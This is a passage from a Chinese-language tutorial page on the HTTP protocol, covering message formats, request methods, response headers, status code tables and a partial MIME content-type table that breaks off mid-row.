服务器等），通过接收客户端的请求并向客户端发送HTTP响应数据。</p><p>HTTP 使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。</p><p>一旦建立连接后，数据消息就通过类似 Internet 邮件所使用的格式[RFC5322]和多用途 Internet 邮件扩展（MIME）[RFC2045]来传送。</p><h3 id="1）客户端请求消息"><a href="#1）客户端请求消息" class="headerlink" title="1）客户端请求消息"></a>1）客户端请求消息</h3><p>客户端发送一个 HTTP 请求到服务器的请求消息包括以下格式：请求行（request line）、请求头部（header）、空行和请求数据四个部分组成，下图给出了请求报文的一般格式。<img src="https://www.runoob.com/wp-content/uploads/2013/11/2012072810301161.png" alt="img"></p><p>请求行以一个方法符号开头，以空格分开，后面跟着请求的 URI 和协议的版本。<br>【Method】 【Request-URI】 【HTTP-Version】 【CRLF】</p><h3 id="2）服务器响应消息"><a href="#2）服务器响应消息" class="headerlink" title="2）服务器响应消息"></a>2）服务器响应消息</h3><p>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</p><p><img src="https://www.runoob.com/wp-content/uploads/2013/11/httpmessage.jpg" alt="img"></p><h3 id="3）实例"><a href="#3）实例" class="headerlink" title="3）实例"></a>3）实例</h3><p>下面实例是一点典型的使用GET来传递数据的实例：</p><p>客户端请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/hello.txt</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>curl/7.16.3 libcurl/7.16.3 OpenSSL/0.9.7l zlib/1.2.3<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.example.com<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en, mi<br></code></pre></td></tr></table></figure><p>服务端响应:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Mon, 27 Jul 2009 12:28:53 GMT<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Apache<br><span class="hljs-attribute">Last-Modified</span><span class="hljs-punctuation">: </span>Wed, 22 Jul 2009 19:15:56 GMT<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>&quot;34aa387-d-1568eb00&quot;<br><span class="hljs-attribute">Accept-Ranges</span><span class="hljs-punctuation">: </span>bytes<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>51<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/plain<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">Hello World! My payload includes a trailing CRLF.<br></code></pre></td></tr></table></figure><h2 id="3、HTTP-请求方法"><a href="#3、HTTP-请求方法" class="headerlink" title="3、HTTP 请求方法"></a>3、HTTP 请求方法</h2><p>根据 HTTP 标准，HTTP 请求可以使用多种请求方法。</p><p>HTTP 1.0 定义了三种请求方法： GET, POST 和 HEAD 方法。</p><p>HTTP 1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。</p><div class="table-container"><table><thead><tr><th>序号</th><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>GET</td><td>请求指定的页面信息，并返回实体主体。</td></tr><tr><td>2</td><td>HEAD</td><td>类似于GET请求，只不过返回的响应中没有具体的内容，用于获取报头。</td></tr><tr><td>3</td><td>POST</td><td>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</td></tr><tr><td>4</td><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档的内容。</td></tr><tr><td>5</td><td>DELETE</td><td>请求服务器删除指定的页面。</td></tr><tr><td>6</td><td>CONNECT</td><td>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td>7</td><td>OPTIONS</td><td>允许客户端查看服务器的性能</td></tr><tr><td>8</td><td>TRACE</td><td>回显服务器收到的请求，主要用于测试或诊断</td></tr><tr><td>9</td><td>PATCH</td><td>是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td></tr></tbody></table></div><p>注意：<br>1）方法名称是区分大小写的。<br>2）HTTP 服务器至少应该实现 GET 和 POST 方法，此外除上述方法，特定的 HTTP 服务器支持扩展自定义的方法。</p><h2 id="4、HTTP-响应头信息"><a href="#4、HTTP-响应头信息" class="headerlink" title="4、HTTP 响应头信息"></a>4、HTTP 响应头信息</h2><p>HTTP请求头提供了关于请求，响应或者其他的发送实体的信息。</p><p>接下来具体介绍HTTP响应头信息。</p><div class="table-container"><table><thead><tr><th style="text-align:left">应答头</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Allow</td><td style="text-align:left">服务器支持哪些请求方法（如GET、POST等）。</td></tr><tr><td style="text-align:left">Content-Encoding</td><td style="text-align:left">文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</td></tr><tr><td style="text-align:left">Content-Length</td><td style="text-align:left">表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入 ByteArrayOutputStream，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</td></tr><tr><td style="text-align:left">Content-Type</td><td style="text-align:left">表示后面的文档属于什么MIME类型。Servlet默认为text/plain，但通常需要显式地指定为text/html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</td></tr><tr><td style="text-align:left">Date</td><td style="text-align:left">当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</td></tr><tr><td style="text-align:left">Expires</td><td style="text-align:left">应该在什么时候认为文档已经过期，从而不再缓存它？</td></tr><tr><td style="text-align:left">Last-Modified</td><td style="text-align:left">文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</td></tr><tr><td style="text-align:left">Location</td><td style="text-align:left">表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</td></tr><tr><td style="text-align:left">Refresh</td><td style="text-align:left">表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(“Refresh”, “5; URL=<a href="http://host/path&quot;)让浏览器读取指定的页面。">http://host/path&quot;)让浏览器读取指定的页面。</a> 注意这种功能通常是通过设置HTML页面HEAD区的＜META HTTP-EQUIV=”Refresh” CONTENT=”5;URL=<a href="http://host/path&quot;＞实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。">http://host/path&quot;＞实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。</a>  注意Refresh的意义是”N秒之后刷新本页面或访问指定页面”，而不是”每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是＜META HTTP-EQUIV=”Refresh” …＞。  注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</td></tr><tr><td style="text-align:left">Server</td><td style="text-align:left">服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</td></tr><tr><td style="text-align:left">Set-Cookie</td><td style="text-align:left">设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</td></tr><tr><td style="text-align:left">WWW-Authenticate</td><td style="text-align:left">客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm=＼”executives＼””)。 注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。</td></tr></tbody></table></div><h2 id="5、HTTP-状态码"><a href="#5、HTTP-状态码" class="headerlink" title="5、HTTP 状态码"></a>5、HTTP 状态码</h2><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含HTTP状态码的信息头（server header）用以响应浏览器的请求。</p><p>HTTP状态码的英文为 HTTP Status Code。</p><p>下面是常见的HTTP状态码：</p><ul><li>200 - 请求成功</li><li>301 - 资源（网页等）被永久转移到其它URL</li><li>404 - 请求的资源（网页等）不存在</li><li>500 - 内部服务器错误</li><li>405 - 某个请求所针对的资源不支持对应的请求方法</li><li>501 - 服务器不认识或者不支持对应的请求方法</li></ul><h3 id="1）HTTP状态码分类"><a href="#1）HTTP状态码分类" class="headerlink" title="1）HTTP状态码分类"></a>1）HTTP状态码分类</h3><p>HTTP状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP状态码共分为5种类型：</p><div class="table-container"><table><thead><tr><th style="text-align:left">分类</th><th style="text-align:left">分类描述</th></tr></thead><tbody><tr><td style="text-align:left">1**</td><td style="text-align:left">信息，服务器收到请求，需要请求者继续执行操作，一般是告诉客户端，请求已经收到了，正在处理，别急。</td></tr><tr><td style="text-align:left">2**</td><td style="text-align:left">成功，操作被成功接收并处理，一般表示：请求收悉、我明白你要的、请求已受理、已经处理完成等信息。</td></tr><tr><td style="text-align:left">3**</td><td style="text-align:left">重定向，需要进一步的操作以完成请求</td></tr><tr><td style="text-align:left">4**</td><td style="text-align:left">客户端错误，请求包含语法错误或无法完成请求，责任在客户端，如客户端的请求一个不存在的资源，客户端未被授权，禁止访问等。</td></tr><tr><td style="text-align:left">5**</td><td style="text-align:left">服务器错误，服务器在处理请求的过程中发生了错误，责任在服务端，如服务端抛出异常，路由出错，HTTP 版本不支持等。</td></tr></tbody></table></div><h3 id="2）HTTP状态码列表"><a href="#2）HTTP状态码列表" class="headerlink" title="2）HTTP状态码列表:"></a>2）HTTP状态码列表:</h3><div class="table-container"><table><thead><tr><th style="text-align:left">状态码</th><th style="text-align:left">状态码英文名称</th><th style="text-align:left">中文描述</th></tr></thead><tbody><tr><td style="text-align:left">100</td><td style="text-align:left">Continue</td><td style="text-align:left">继续。客户端应继续其请求</td></tr><tr><td style="text-align:left">101</td><td style="text-align:left">Switching Protocols</td><td style="text-align:left">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">200</td><td style="text-align:left">OK</td><td style="text-align:left">请求成功。一般用于GET与POST请求</td></tr><tr><td style="text-align:left">201</td><td style="text-align:left">Created</td><td style="text-align:left">已创建。成功请求并创建了新的资源</td></tr><tr><td style="text-align:left">202</td><td style="text-align:left">Accepted</td><td style="text-align:left">已接受。已经接受请求，但未处理完成</td></tr><tr><td style="text-align:left">203</td><td style="text-align:left">Non-Authoritative Information</td><td style="text-align:left">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td style="text-align:left">204</td><td style="text-align:left">No Content</td><td style="text-align:left">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td style="text-align:left">205</td><td style="text-align:left">Reset Content</td><td style="text-align:left">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td style="text-align:left">206</td><td style="text-align:left">Partial Content</td><td style="text-align:left">部分内容。服务器成功处理了部分GET请求</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">300</td><td style="text-align:left">Multiple Choices</td><td style="text-align:left">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td style="text-align:left">301</td><td style="text-align:left">Moved Permanently</td><td style="text-align:left">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td style="text-align:left">302</td><td style="text-align:left">Found</td><td style="text-align:left">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td style="text-align:left">303</td><td style="text-align:left">See Other</td><td style="text-align:left">查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td style="text-align:left">304</td><td style="text-align:left">Not Modified</td><td style="text-align:left">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td style="text-align:left">305</td><td style="text-align:left">Use Proxy</td><td style="text-align:left">使用代理。所请求的资源必须通过代理访问</td></tr><tr><td style="text-align:left">306</td><td style="text-align:left">Unused</td><td style="text-align:left">已经被废弃的HTTP状态码</td></tr><tr><td style="text-align:left">307</td><td style="text-align:left">Temporary Redirect</td><td style="text-align:left">临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">400</td><td style="text-align:left">Bad Request</td><td style="text-align:left">客户端请求的语法错误，服务器无法理解</td></tr><tr><td style="text-align:left">401</td><td style="text-align:left">Unauthorized</td><td style="text-align:left">请求要求用户的身份认证</td></tr><tr><td style="text-align:left">402</td><td style="text-align:left">Payment Required</td><td style="text-align:left">保留，将来使用</td></tr><tr><td style="text-align:left">403</td><td style="text-align:left">Forbidden</td><td style="text-align:left">服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td style="text-align:left">404</td><td style="text-align:left">Not Found</td><td style="text-align:left">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td style="text-align:left">405</td><td style="text-align:left">Method Not Allowed</td><td style="text-align:left">客户端请求中的方法被禁止</td></tr><tr><td style="text-align:left">406</td><td style="text-align:left">Not Acceptable</td><td style="text-align:left">服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td style="text-align:left">407</td><td style="text-align:left">Proxy Authentication Required</td><td style="text-align:left">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td style="text-align:left">408</td><td style="text-align:left">Request Time-out</td><td style="text-align:left">服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td style="text-align:left">409</td><td style="text-align:left">Conflict</td><td style="text-align:left">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td style="text-align:left">410</td><td style="text-align:left">Gone</td><td style="text-align:left">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td style="text-align:left">411</td><td style="text-align:left">Length Required</td><td style="text-align:left">服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td style="text-align:left">412</td><td style="text-align:left">Precondition Failed</td><td style="text-align:left">客户端请求信息的先决条件错误</td></tr><tr><td style="text-align:left">413</td><td style="text-align:left">Request Entity Too Large</td><td style="text-align:left">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td style="text-align:left">414</td><td style="text-align:left">Request-URI Too Large</td><td style="text-align:left">请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td style="text-align:left">415</td><td style="text-align:left">Unsupported Media Type</td><td style="text-align:left">服务器无法处理请求附带的媒体格式</td></tr><tr><td style="text-align:left">416</td><td style="text-align:left">Requested range not satisfiable</td><td style="text-align:left">客户端请求的范围无效</td></tr><tr><td style="text-align:left">417</td><td style="text-align:left">Expectation Failed</td><td style="text-align:left">服务器无法满足Expect的请求头信息</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">500</td><td style="text-align:left">Internal Server Error</td><td style="text-align:left">服务器内部错误，无法完成请求</td></tr><tr><td style="text-align:left">501</td><td style="text-align:left">Not Implemented</td><td style="text-align:left">服务器不支持请求的功能，无法完成请求</td></tr><tr><td style="text-align:left">502</td><td style="text-align:left">Bad Gateway</td><td style="text-align:left">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td style="text-align:left">503</td><td style="text-align:left">Service Unavailable</td><td style="text-align:left">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td style="text-align:left">504</td><td style="text-align:left">Gateway Time-out</td><td style="text-align:left">充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td style="text-align:left">505</td><td style="text-align:left">HTTP Version not supported</td><td style="text-align:left">服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table></div><h3 id="3）HTTP状态码"><a href="#3）HTTP状态码" class="headerlink" title="3）HTTP状态码"></a>3）HTTP状态码</h3><div class="table-container"><table><thead><tr><th>消息</th><th></th><th>请求错误</th><th></th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>400</td><td>Bad Request</td></tr><tr><td>101</td><td>Switching Protocols</td><td>401</td><td>unauthorized</td></tr><tr><td>102</td><td>Processing</td><td>402</td><td>Payment Required</td></tr><tr><td><strong>成功</strong></td><td></td><td>403</td><td>Forbidden</td></tr><tr><td>200</td><td>OK</td><td>404</td><td>Not Found</td></tr><tr><td>201</td><td>Created</td><td>405</td><td>Method Not Allowed</td></tr><tr><td>202</td><td>Accepted</td><td>406</td><td>Not Acceptable</td></tr><tr><td>203</td><td>Non-Authoritative lnforrnation</td><td>407</td><td>Proxy Authentication Required</td></tr><tr><td>204</td><td>No Content</td><td>408</td><td>Request Timeout</td></tr><tr><td>205</td><td>Reset Content</td><td>409</td><td>Conflict</td></tr><tr><td>206</td><td>Partial Content</td><td>410</td><td>Gone</td></tr><tr><td>207</td><td>Multi-Status</td><td>411</td><td>Length Required</td></tr><tr><td><strong>重定向</strong></td><td></td><td>412</td><td>Precondition Failed</td></tr><tr><td>300</td><td>Multiple Choices</td><td>413</td><td>Request Entity Too Large</td></tr><tr><td>301</td><td>Moved Permanently</td><td>414</td><td>Request-URI Too Long</td></tr><tr><td>302</td><td>Move Temporarily</td><td>415</td><td>Unsupported Media Type</td></tr><tr><td>303</td><td>See Other</td><td>416</td><td>Requested Range Not Satisfiable</td></tr><tr><td>304</td><td>Not Modified</td><td>417</td><td>Expectation Failed</td></tr><tr><td>305</td><td>Use Proxy</td><td>418</td><td>I ‘ m a teapot</td></tr><tr><td>306</td><td>Switch Proxy</td><td>421</td><td>Too Many Connections</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>422</td><td>Unprocessable Entity</td></tr><tr><td><strong>服务器错误</strong></td><td></td><td>423</td><td>Locked</td></tr><tr><td>500</td><td>lnternal Server Error</td><td>424</td><td>Failed Dependency</td></tr><tr><td>501</td><td>Not lmplemented</td><td>425</td><td>Too Early</td></tr><tr><td>502</td><td>Bad Gateway</td><td>426</td><td>Upgrade Required</td></tr><tr><td>503</td><td>Service unavailable</td><td>449</td><td>Retry With</td></tr><tr><td>504</td><td>Gateway Timeout</td><td>451</td><td>Unavailable For Legal Reasons</td></tr><tr><td>505</td><td>HTTP Version Not Supported</td><td></td><td></td></tr><tr><td>506</td><td>Variant Also Negotiates</td><td></td><td></td></tr><tr><td>507</td><td>lnsuffcient Storage</td><td></td><td></td></tr><tr><td>509</td><td>Bandwidth Limit Exceeded</td><td></td><td></td></tr><tr><td>510</td><td>Not Extended</td><td></td><td></td></tr><tr><td>600</td><td>Unparseable Response Headers</td><td></td></tr></tbody></table></div><h2 id="6、HTTP-content-type"><a href="#6、HTTP-content-type" class="headerlink" title="6、HTTP content-type"></a>6、HTTP content-type</h2><p>Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。</p><p>Content-Type 标头告诉客户端实际返回的内容的内容类型。</p><p>语法格式：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=something<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br></code></pre></td></tr></table></figure><h3 id="1）媒体格式类型"><a href="#1）媒体格式类型" class="headerlink" title="1）媒体格式类型"></a>1）媒体格式类型</h3><p>常见的媒体格式类型如下：</p><ul><li>text/html ： HTML格式</li><li>text/plain ：纯文本格式</li><li>text/xml ： XML格式</li><li>image/gif ：gif图片格式</li><li>image/jpeg ：jpg图片格式</li><li>image/png：png图片格式</li></ul><p>以application开头的媒体格式类型：</p><ul><li>application/xhtml+xml ：XHTML格式</li><li>application/xml： XML数据格式</li><li>application/atom+xml ：Atom XML聚合格式</li><li>application/json： JSON数据格式</li><li>application/pdf：pdf格式</li><li>application/msword ： Word文档格式</li><li>application/octet-stream ： 二进制流数据（如常见的文件下载）</li><li>application/x-www-form-urlencoded ： <form enctype="””">中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）</form></li></ul><p>另外一种常见的媒体格式是上传文件之时使用的：</p><ul><li>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</li></ul><h3 id="2）HTTP-content-type-对照表"><a href="#2）HTTP-content-type-对照表" class="headerlink" title="2）HTTP content-type 对照表"></a>2）HTTP content-type 对照表</h3><div class="table-container"><table><thead><tr><th style="text-align:left">文件扩展名</th><th style="text-align:left">Content-Type(Mime-Type)</th><th style="text-align:left">文件扩展名</th><th style="text-align:left">Content-Type(Mime-Type)</th></tr></thead><tbody><tr><td style="text-align:left">.*（ 二进制流，不知道下载文件类型）</td><td style="text-align:left">application/octet-stream</td><td style="text-align:left">.tif</td><td style="text-align:left">image/tiff</td></tr><tr><td style="text-align:left">.001</td><td style="text-align:left">application/x-001</td><td style="text-align:left">.301</td><td style="text-align:left">application/x-301</td></tr><tr><td style="text-align:left">.323</td><td style="text-align:left">text/h323</td><td style="text-align:left">.906</td><td style="text-align:left">application/x-906</td></tr><tr><td style="text-align:left">.907</td><td style="text-align:left">drawing/907</td><td style="text-align:left">.a11</td><td style="text-align:left">application/x-a11</td></tr><tr><td style="text-align:left">.acp</td><td style="text-align:left">audio/x-mei-aac</td><td style="text-align:left">.ai</td><td style="text-align:left">application/postscript</td></tr><tr><td style="text-align:left">.aif</td><td style="text-align:left">audio/aiff</td><td style="text-align:left">.aifc</td><td style="text-align:left">audio/aiff</td></tr><tr><td style="text-align:left">.aiff</td><td style="text-align:left">audio/aiff</td><td style="text-align:left">.anv</td><td style="text-align:left">application/x-anv</td></tr><tr><td style="text-align:left">.asa</td><td style="text-align:left">text/asa</td><td style="text-align:left">.asf</td><td style="text-align:left">video/x-ms-asf</td></tr><tr><td style="text-align:left">.asp</td><td style="text-align:left">text/asp</td><td style="text-align:left">.asx</td><td style="text-align:left">video/x-ms-asf</td></tr><tr><td style="text-align:left">.au</td><td style="text-align:left">audio/basic</td><td style="text-align:left">.avi</td><td style="text-align:left">video/avi</td></tr><tr><td style="text-align:left">.awf</td><td style="text-align:left">application/vnd.adobe.workflow</td><td style="text-align:left">.biz</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.bmp</td><td style="text-align:left">application/x-bmp</td><td style="text-align:left">.bot</td><td style="text-align:left">application/x-bot</td></tr><tr><td style="text-align:left">.c4t</td><td style="text-align:left">application/x-c4t</td><td style="text-align:left">.c90</td><td style="text-align:left">application/x-c90</td></tr><tr><td style="text-align:left">.cal</td><td style="text-align:left">application/x-cals</td><td style="text-align:left">.cat</td><td style="text-align:left">application/vnd.ms-pki.seccat</td></tr><tr><td style="text-align:left">.cdf</td><td style="text-align:left">application/x-netcdf</td><td style="text-align:left">.cdr</td><td style="text-align:left">application/x-cdr</td></tr><tr><td style="text-align:left">.cel</td><td style="text-align:left">application/x-cel</td><td style="text-align:left">.cer</td><td style="text-align:left">application/x-x509-ca-cert</td></tr><tr><td style="text-align:left">.cg4</td><td style="text-align:left">application/x-g4</td><td style="text-align:left">.cgm</td><td style="text-align:left">application/x-cgm</td></tr><tr><td style="text-align:left">.cit</td><td style="text-align:left">application/x-cit</td><td style="text-align:left">.class</td><td style="text-align:left">java/*</td></tr><tr><td style="text-align:left">.cml</td><td style="text-align:left">text/xml</td><td style="text-align:left">.cmp</td><td style="text-align:left">application/x-cmp</td></tr><tr><td style="text-align:left">.cmx</td><td style="text-align:left">application/x-cmx</td><td style="text-align:left">.cot</td><td style="text-align:left">application/x-cot</td></tr><tr><td style="text-align:left">.crl</td><td style="text-align:left">application/pkix-crl</td><td style="text-align:left">.crt</td><td style="text-align:left">application/x-x509-ca-cert</td></tr><tr><td style="text-align:left">.csi</td><td style="text-align:left">application/x-csi</td><td style="text-align:left">.css</td><td style="text-align:left">text/css</td></tr><tr><td style="text-align:left">.cut</td><td style="text-align:left">application/x-cut</td><td style="text-align:left">.dbf</td><td style="text-align:left">application/x-dbf</td></tr><tr><td style="text-align:left">.dbm</td><td style="text-align:left">application/x-dbm</td><td style="text-align:left">.dbx</td><td style="text-align:left">application/x-dbx</td></tr><tr><td style="text-align:left">.dcd</td><td style="text-align:left">text/xml</td><td style="text-align:left">.dcx</td><td style="text-align:left">application/x-dcx</td></tr><tr><td style="text-align:left">.der</td><td style="text-align:left">application/x-x509-ca-cert</td><td style="text-align:left">.dgn</td><td style="text-align:left">application/x-dgn</td></tr><tr><td style="text-align:left">.dib</td><td style="text-align:left">application/x-dib</td><td style="text-align:left">.dll</td><td style="text-align:left">application/x-msdownload</td></tr><tr><td style="text-align:left">.doc</td><td style="text-align:left">application/msword</td><td style="text-align:left">.dot</td><td style="text-align:left">application/msword</td></tr><tr><td style="text-align:left">.drw</td><td style="text-align:left">application/x-drw</td><td style="text-align:left">.dtd</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.dwf</td><td style="text-align:left">Model/vnd.dwf</td><td style="text-align:left">.dwf</td><td style="text-align:left">application/x-dwf</td></tr><tr><td style="text-align:left">.dwg</td><td style="text-align:left">application/x-dwg</td><td style="text-align:left">.dxb</td><td style="text-align:left">application/x-dxb</td></tr><tr><td style="text-align:left">.dxf</td><td style="text-align:left">application/x-dxf</td><td style="text-align:left">.edn</td><td style="text-align:left">application/vnd.adobe.edn</td></tr><tr><td style="text-align:left">.emf</td><td style="text-align:left">application/x-emf</td><td style="text-align:left">.eml</td><td style="text-align:left">message/rfc822</td></tr><tr><td style="text-align:left">.ent</td><td style="text-align:left">text/xml</td><td style="text-align:left">.epi</td><td style="text-align:left">application/x-epi</td></tr><tr><td style="text-align:left">.eps</td><td style="text-align:left">application/x-ps</td><td style="text-align:left">.eps</td><td style="text-align:left">application/postscript</td></tr><tr><td style="text-align:left">.etd</td><td style="text-align:left">application/x-ebx</td><td style="text-align:left">.exe</td><td style="text-align:left">application/x-msdownload</td></tr><tr><td style="text-align:left">.fax</td><td style="text-align:left">image/fax</td><td style="text-align:left">.fdf</td><td style="text-align:left">application/vnd.fdf</td></tr><tr><td style="text-align:left">.fif</td><td style="text-align:left">application/fractals</td><td style="text-align:left">.fo</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.frm</td><td style="text-align:left">application/x-frm</td><td style="text-align:left">.g4</td><td style="text-align:left">application/x-g4</td></tr><tr><td style="text-align:left">.gbr</td><td style="text-align:left">application/x-gbr</td><td style="text-align:left">.</td><td style="text-align:left">application/x-</td></tr><tr><td style="text-align:left">.gif</td><td style="text-align:left">image/gif</td><td style="text-align:left">.gl2</td><td style="text-align:left">application/x-gl2</td></tr><tr><td style="text-align:left">.gp4</td><td style="text-align:left">application/x-gp4</td><td style="text-align:left">.hgl</td><td style="text-align:left">application/x-hgl</td></tr><tr><td style="text-align:left">.hmr</td><td style="text-align:left">application/x-hmr</td><td style="text-align:left">.hpg</td><td style="text-align:left">application/x-hpgl</td></tr><tr><td style="text-align:left">.hpl</td><td style="text-align:left">application/x-hpl</td><td style="text-align:left">.hqx</td><td style="text-align:left">application/mac-binhex40</td></tr><tr><td style="text-align:left">.hrf</td><td style="text-align:left">application/x-hrf</td><td style="text-align:left">.hta</td><td style="text-align:left">application/hta</td></tr><tr><td 